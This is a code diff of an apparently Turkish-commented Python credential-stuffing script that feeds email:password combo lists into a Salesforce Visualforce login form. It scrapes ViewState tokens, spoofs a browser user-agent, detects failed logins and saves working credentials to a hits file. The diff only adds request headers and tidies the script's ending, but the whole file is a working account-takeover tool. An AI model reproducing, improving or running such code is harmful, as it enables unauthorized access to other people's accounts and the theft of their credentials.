@@ -23,13 +23,15 @@ def aws(): ## Fonksiyonumuz
         user_data = {
             'AJAXREQUEST': '_viewRoot',
             'loginPage:siteLogin:loginComponent:loginForm': 'loginPage:siteLogin:loginComponent:loginForm',
-            'loginPage:siteLogin:loginComponent:loginForm:username': ''+combo[0],## Email=0
-            'loginPage:siteLogin:loginComponent:loginForm:password': ''+combo[1],## Password=1
+            'loginPage:siteLogin:loginComponent:loginForm:username': ''+combo[0], ## Email=0
+            'loginPage:siteLogin:loginComponent:loginForm:password': ''+combo[1], ## Password=1
             'com.salesforce.visualforce.ViewStateVersion': '202009031813360944',
             'loginPage:siteLogin:loginComponent:loginForm:j_id10': 'loginPage:siteLogin:loginComponent:loginForm:j_id10',        
         }
 
-        user_agent = {'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'}
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'
+        }
 
         with requests.session() as req: ## request modulünü session(oturum) olarak ve kısaltma olarak "req" olarak çağırdık.
             ## Sitemizin bilgilerini çekiyoruz
@@ -41,7 +43,7 @@ def aws(): ## Fonksiyonumuz
             user_data["com.salesforce.visualforce.ViewState"] = Soup.find(id="com.salesforce.visualforce.ViewState")["value"]
             user_data["com.salesforce.visualforce.ViewStateMAC"] = Soup.find(id="com.salesforce.visualforce.ViewStateMAC")["value"]
 
-            giris_yap = req.post(url,data=user_data) ## yaptığımız işlemleri siteye gönderiyoruz.
+            giris_yap = req.post(url,data=user_data,headers=headers) ## yaptığımız işlemleri siteye gönderiyoruz.
 
             ## Kontrol mekanizması olduğu kısım "şifre yanlış"  gibi durumları yapacağı kısım
             if "Your login attempt has failed. Make sure the username and password are correct." in giris_yap.text:
@@ -63,8 +65,6 @@ def aws(): ## Fonksiyonumuz
                 hit.write(combo[1])
                 hit.write("\n")
                 hit.close()
+aws()  ## aws fonksiyonumuzu başlatır
 
-
-aws() ## aws fonksiyonumuzu başlatır
-
-
+print("islem bitmistir.")
